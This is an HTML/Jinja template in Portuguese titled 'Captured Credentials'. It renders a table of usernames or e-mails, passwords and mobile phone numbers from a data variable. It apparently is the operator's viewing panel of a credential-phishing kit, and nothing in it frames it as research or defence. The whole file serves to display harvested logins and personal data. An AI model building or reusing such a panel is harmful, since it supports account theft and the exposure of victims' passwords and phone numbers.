<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <title>Credenciais Capturadas</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      background: #121212;
      color: #f1f1f1;
      font-family: 'Segoe UI', sans-serif;
      padding: 20px;
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      background-color: #1e1e1e;
      border-radius: 8px;
      overflow: hidden;
    }
    th, td {
      padding: 12px;
      text-align: center;
      border-bottom: 1px solid #333;
    }
    th {
      background: #2a2a2a;
      color: #00d0ff;
    }
    tr:hover {
      background-color: #2f2f2f;
    }
  </style>
</head>
<body>
  <h2>Credenciais Capturadas</h2>
  <table>
    <tr>
      <th>Usuário/E-mail</th>
      <th>Palavra-Chave</th>
      <th>Telemóvel</th>
    </tr>
    {% for linha in dados %}
      <tr>
        <td>{{ linha[0] }}</td>
        <td>{{ linha[1] }}</td>
        <td>{{ linha[2] }}</td>
      </tr>
    {% endfor %}
  </table>
</body>
</html>
